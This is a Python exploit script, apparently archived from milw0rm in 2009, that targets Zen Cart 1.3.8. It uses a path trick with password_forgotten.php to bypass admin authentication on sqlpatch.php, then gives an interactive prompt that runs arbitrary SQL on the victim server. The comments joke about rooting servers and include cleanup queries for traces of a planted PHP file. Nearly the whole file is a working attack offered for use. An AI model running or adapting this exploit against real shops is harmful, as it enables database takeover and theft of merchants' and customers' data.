#!/usr/bin/python

#
# ------- Zen Cart 1.3.8 Remote SQL Execution
# http://www.zen-cart.com/
# Zen Cart Ecommerce - putting the dream of server rooting within reach of anyone!
# A new version (1.3.8a) is avaible on http://www.zen-cart.com/
#
# BlackH :)
#

#
# Notes: must have admin/sqlpatch.php enabled
#
# clean the database :
#	DELETE FROM `record_company_info` WHERE `record_company_id` = (SELECT `record_company_id` FROM `record_company` WHERE `record_company_image` = '8d317.php' LIMIT 1);
#	DELETE FROM `record_company` WHERE `record_company_image` = '8d317.php';

import urllib, urllib2, re, sys

a,b = sys.argv,0

def option(name, need = 0):
	global a, b
	for param in sys.argv:
		if(param == '-'+name): return str(sys.argv[b+1])
		b = b + 1
	if(need):
		print '\n#error', "-"+name, 'parameter required'
		exit(1)

if (len(sys.argv) < 2):
	print """
=____________ Zen Cart 1.3.8 Remote SQL Execution Exploit  ____________=
========================================================================
|                  BlackH <Bl4ck.H@gmail.com>                          |
========================================================================
|                                                                      |
| $system> python """+sys.argv[0]+""" -url <url>                                 |
| Param: <url>      ex: http://victim.com/site (no slash)              |
|                                                                      |
| Note: blind "injection"                                              |
========================================================================
	"""
	exit(1)

url, trick = option('url', 1), "/password_forgotten.php"

while True:
	cmd = raw_input('sql@jah$ ')
	if (cmd == "exit"): exit(1)
	req = urllib2.Request(url+"/admin/sqlpatch.php"+trick+"?action=execute", urllib.urlencode({'query_string' : cmd}))
	if (re.findall('1 statements processed',urllib2.urlopen(req).read())):
		print '>> success (', cmd, ")"
	else:
		print '>> failed, be sure to end with ; (', cmd, ")"

# milw0rm.com [2009-06-23]